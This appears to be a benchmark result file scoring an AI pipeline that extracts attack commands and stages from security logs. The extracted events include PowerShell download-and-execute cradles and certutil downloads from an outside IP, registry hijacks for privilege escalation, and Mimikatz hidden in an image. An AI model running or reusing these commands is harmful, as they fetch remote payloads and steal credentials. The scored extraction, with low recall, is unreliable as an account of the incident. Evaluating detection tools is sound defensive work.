@@ -1,0 +1,108 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\ud835\udc01\ud835\udcbc\ud835\udcd7'.\ud83e\udd08'B.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c `\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))`\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  reg add \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f && reg add \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" /v \"(default)\" /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  reg add \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" /v \"(default)\" /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  Get-ChildItem Env:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  Get-Process > $env:TEMP\\T1119_3.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  Get-Service > $env:TEMP\\T1119_1.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Get-ChildItem Env: > $env:TEMP\\T1119_2.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  Copy-Item `.\\msxsl.exe` `c:\\Windows\\Temp\\msxsl.exe`;Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C  Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\Desktop\\shell\\Test.hta",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "An advanced attack took place involving multiple vectors and techniques. The initial access likely utilized a vulnerability, downloading malware using certutil and executing it via PowerShell while bypassing execution policies. System information gathering followed, revealing environment variables, running processes, and installed services. This reconnaissance could have been used to identify vulnerabilities and prepare the ground for further actions. Additionally, credential theft might have occurred through the use of Mimikatz. Commands and tasks were scheduled persistently, ensuring continued access. Commands were received from an external server over HTTP requests, manipulating settings and tools like port proxies and registry entries.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121758,
+      "completion_tokens": 3026,
+      "total_tokens": 124784,
+      "wall_clock_s": 234.596,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35714285714285715,
+      "recall": 0.19230769230769232,
+      "f1": 0.25,
+      "tp": 5,
+      "fp": 9,
+      "fn": 21
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.08333333333333333,
+      "f1": 0.10526315789473685,
+      "tp": 2,
+      "fp": 12,
+      "fn": 22,
+      "recall_partial": 0.06521739130434782
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121758,
+      "completion_tokens": 3026,
+      "total_tokens": 124784,
+      "wall_clock_s": 234.596,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
